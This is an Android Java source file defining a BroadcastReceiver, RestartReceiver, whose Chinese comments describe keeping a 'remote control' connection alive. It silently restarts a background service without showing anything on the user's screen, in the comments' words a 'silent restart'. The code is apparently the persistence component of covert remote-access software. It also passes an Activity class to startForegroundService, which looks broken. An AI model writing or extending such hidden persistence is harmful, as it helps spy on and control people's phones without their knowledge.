package com.orbit;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class RestartReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        // 1. 先把后台服务拉起来，确保远控连接不断
        Intent serviceIntent = new Intent(context, SplashActivity.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(serviceIntent);
        } else {
            context.startService(serviceIntent);
        }

        // 2. 根据你之前的“快照状态”，决定要不要弹界面
        boolean needUI = intent.getBooleanExtra("NEED_START_ACTIVITY", false);
        if (needUI) {
            // 只有明确需要时才弹界面
            Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage(context.getPackageName());
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(launchIntent);
        }
        // 如果 needUI 为 false，代码执行到这里就结束了。
        // 结果就是：进程活了，Service 跑了，但用户手机屏幕没反应。这就是“静默重启”。
    }
}